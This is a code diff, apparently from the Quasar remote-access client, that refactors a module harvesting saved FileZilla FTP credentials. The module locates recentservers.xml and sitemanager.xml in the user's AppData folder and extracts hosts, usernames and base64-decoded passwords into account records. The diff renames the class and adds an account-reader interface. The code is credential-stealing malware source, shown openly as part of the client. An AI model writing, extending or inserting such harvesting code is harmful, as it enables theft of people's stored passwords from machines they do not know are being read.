@@ -1,18 +1,23 @@
-﻿using System;
+﻿using Quasar.Common.Models;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
 using System.Xml;
-using Quasar.Common.Models;
 
 namespace Quasar.Client.Recovery.FtpClients
 {
-    public class FileZilla
+    public class FileZillaPassReader : IAccountReader
     {
-        public static string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
-        public static string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+        /// <inheritdoc />
+        public string ApplicationName => "FileZilla";
 
-        public static List<RecoveredAccount> GetSavedPasswords()
+        public string RecentServerPath = string.Format(@"{0}\FileZilla\recentservers.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+
+        public string SiteManagerPath = string.Format(@"{0}\FileZilla\sitemanager.xml", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
+
+        /// <inheritdoc />
+        public IEnumerable<RecoveredAccount> ReadAccounts()
         {
             List<RecoveredAccount> data = new List<RecoveredAccount>();
             try
@@ -48,7 +53,7 @@ namespace Quasar.Client.Recovery.FtpClients
                             Url = szHost,
                             Username = szUsername,
                             Password = szPassword,
-                            Application = "FileZilla"
+                            Application = ApplicationName
                         });
                     }
                 }
@@ -93,7 +98,7 @@ namespace Quasar.Client.Recovery.FtpClients
             }
         }
 
-        public static string Base64Decode(string szInput)
+        public string Base64Decode(string szInput)
         {
             try
             {
